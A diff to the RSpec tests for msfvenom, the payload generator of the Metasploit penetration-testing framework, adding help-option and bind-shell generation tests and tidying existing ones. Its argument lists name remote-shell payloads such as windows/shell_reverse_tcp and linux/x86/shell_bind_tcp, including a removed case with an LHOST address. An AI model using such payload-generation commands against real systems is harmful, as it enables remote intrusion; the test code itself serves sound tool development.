@@ -86,20 +86,24 @@ describe MsfVenom do
 
 	describe "#parse_args" do
 
+		context "help" do
+			it "should raise UsageError" do
+				expect { venom.parse_args(%w! -h !) }.to raise_error(MsfVenom::UsageError)
+				expect { venom.parse_args(%w! --help !) }.to raise_error(MsfVenom::UsageError)
+				expect { venom.parse_args(%w! --help-formats !) }.to raise_error(MsfVenom::UsageError)
+			end
+		end
+
 		context "with unexpected options" do
 			it "should raise" do
-				expect {
-					venom.parse_args(%w! --non-existent-option !)
-				}.to raise_error(MsfVenom::UsageError)
+				expect { venom.parse_args(%w! --non-existent-option !) }.to raise_error(MsfVenom::UsageError)
 			end
 		end
 
 		context "with missing required arg" do
 			%w! --platform -a -b -c -f -p -n -s -i -x !.each do |required_arg|
 				it "#{required_arg} should raise" do
-					expect {
-						venom.parse_args([required_arg])
-					}.to raise_error(MsfVenom::UsageError)
+					expect { venom.parse_args([required_arg]) }.to raise_error(MsfVenom::UsageError)
 				end
 			end
 		end
@@ -113,27 +117,46 @@ describe MsfVenom do
 		end
 
 		context "with --options" do
+
 			context "and a payload" do
 				let(:args) { %w! -o -p windows/meterpreter/reverse_tcp ! }
-
 				it "should print options" do
-					expect {
-						venom.generate_raw_payload
-					}.to_not raise_error
+					expect { venom.generate_raw_payload }.to_not raise_error
 					output = stderr.string
 					output.should include("LHOST")
 					output.should include("LPORT")
 				end
 			end
+
 			context "and an invalid payload" do
 				let(:args) { %w! -o -p asdf! }
 				it "should raise" do
-					expect {
-						venom.generate_raw_payload
-					}.to raise_error(MsfVenom::UsageError)
+					expect { venom.generate_raw_payload }.to raise_error(MsfVenom::UsageError)
 				end
 			end
 
+		end
+
+		context "building an elf with linux/x86/shell_bind_tcp" do
+			let(:args) { %w! -f elf -p linux/x86/shell_bind_tcp ! }
+			# We're not encoding, so should be testable here
+			it "should contain /bin/sh" do
+				output = venom.generate_raw_payload
+				# usually push'd, so it's not all strung together
+				output.should include("/sh")
+				output.should include("/bin")
+			end
+		end
+
+		context "with a raw linux/x86/shell_bind_tcp" do
+			let(:args) { %w! -f raw -p linux/x86/shell_bind_tcp ! }
+			# We're not encoding, so should be testable here
+			it "should contain /bin/sh" do
+				output = venom.generate_raw_payload
+				# usually push'd, so it's not all strung together
+				output.should include("/sh")
+				output.should include("/bin")
+			end
 		end
 
 	end
@@ -143,16 +166,7 @@ describe MsfVenom do
 
 		before { venom.parse_args(args) }
 
-		context "with 'exe' format" do
-			let(:args) { %w!-f exe -p windows/shell_reverse_tcp LHOST=192.168.0.1! }
-			it "should print an exe to stdout" do
-				expect { venom.generate }.to_not raise_error
-				output = stdout.string
-				output[0,2].should == "MZ"
-			end
-		end
-
-		context "with incorrect datastore option format" do
+		context "with invalid datastore option" do
 			let(:args) { %w!-f exe -p windows/shell_reverse_tcp LPORT=asdf! }
 			it "should fail validation" do
 				expect { venom.generate }.to raise_error(Msf::OptionValidateError)
@@ -160,6 +174,7 @@ describe MsfVenom do
 		end
 
 		context "without required datastore option" do
+			# Requires LHOST
 			let(:args) { %w!-f exe -p windows/shell_reverse_tcp ! }
 			it "should fail validation" do
 				expect { venom.generate }.to raise_error(Msf::OptionValidateError)
@@ -168,6 +183,7 @@ describe MsfVenom do
 
 		@platform_format_map.each do |plat, formats|
 			formats.each do |format_hash|
+				# Need a new context for each so the let() will work correctly
 				context "with format=#{format_hash[:format]} platform=#{plat} arch=#{format_hash[:arch]}" do
 					# This will build executables with no payload. They won't work
 					# of course, but at least we can see that it is producing the
